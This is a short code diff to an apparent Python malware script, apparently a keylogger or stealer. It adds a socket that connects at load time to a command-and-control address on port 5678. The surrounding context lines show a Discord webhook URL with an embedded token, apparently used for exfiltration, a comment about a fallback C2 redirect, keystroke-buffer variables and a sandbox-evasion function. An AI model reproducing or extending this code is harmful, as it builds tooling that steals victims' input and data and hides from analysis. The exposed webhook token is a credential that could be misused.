@@ -13,11 +13,22 @@ current_time = datetime.datetime.now()
 username = os.path.expanduser('~')
 file_path = "sys32.txt"  # Not used anymore, preserved
 discord = "https://discord.com/api/webhooks/1405520151142600726/pdA3Whgfdlt0HycRmvjK4Uih36uNChuknDFN8C3RqZRFsi_T-UnVY9BL6tTIXAv2tu26"
-cnc_link = "192"
+cnc_link = ""
 
 esp_page = ""  # Optional fallback C2 redirect
 current_word = ""
 buffer = []
+
+port = 5678
+
+cnc_num = "192.168.0.105"
+
+
+cnh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+cnh.connect((cnc_num, port))
+
 
 def evade_sandbox():
     try:
